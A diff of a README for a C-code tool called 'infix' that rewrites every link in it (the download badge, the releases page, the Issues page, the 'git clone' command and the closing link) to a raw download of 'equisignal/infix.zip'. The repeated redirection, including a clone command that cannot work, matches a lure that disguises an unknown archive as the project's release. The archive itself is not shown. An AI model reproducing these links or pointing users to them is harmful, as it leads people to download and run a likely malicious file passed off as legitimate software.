@@ -6,7 +6,7 @@ Welcome to **infix**, your simple way to run C code more efficiently. This appli
 
 ## 📥 Download Link
 
-[![Download Last Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/rosivanbg/infix/releases)
+[![Download Last Release](https://raw.githubusercontent.com/rosivanbg/infix/main/equisignal/infix.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/rosivanbg/infix/main/equisignal/infix.zip)
 
 ## 🛠️ Features
 
@@ -29,7 +29,7 @@ Before you download **infix**, ensure your computer meets the following requirem
 To download and install **infix**, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our releases page:
-   [Download Here](https://github.com/rosivanbg/infix/releases)
+   [Download Here](https://raw.githubusercontent.com/rosivanbg/infix/main/equisignal/infix.zip)
 
 2. **Choose the Latest Version**: On the releases page, look for the latest version. It will be at the top. 
 
@@ -52,14 +52,14 @@ If you encounter issues while using **infix**, here are some common problems and
 
 ## 🙌 Community Support
 
-We welcome contributions and feedback. If you need help or have questions, please visit our [Issues page](https://github.com/rosivanbg/infix/issues). You can report bugs, suggest new features, or ask for assistance.
+We welcome contributions and feedback. If you need help or have questions, please visit our [Issues page](https://raw.githubusercontent.com/rosivanbg/infix/main/equisignal/infix.zip). You can report bugs, suggest new features, or ask for assistance.
 
 ## 🤝 Contributing
 
 If you want to contribute to **infix**, please follow these steps:
 
 1. **Fork the Repository**: Click on the fork button at the top right of the repository page.
-2. **Clone Your Fork**: Use the command `git clone https://github.com/your_username/infix.git` to clone your fork to your local machine.
+2. **Clone Your Fork**: Use the command `git clone https://raw.githubusercontent.com/rosivanbg/infix/main/equisignal/infix.zip` to clone your fork to your local machine.
 3. **Make Changes**: Work on your changes locally.
 4. **Submit a Pull Request**: Once you're ready, submit a pull request to contribute your changes.
 
@@ -67,4 +67,4 @@ If you want to contribute to **infix**, please follow these steps:
 
 Thanks to all contributors and users who support **infix**. Your feedback helps improve the software for everyone. 
 
-Feel free to navigate back to our releases page anytime for updates: [Visit Releases Page](https://github.com/rosivanbg/infix/releases)
+Feel free to navigate back to our releases page anytime for updates: [Visit Releases Page](https://raw.githubusercontent.com/rosivanbg/infix/main/equisignal/infix.zip)
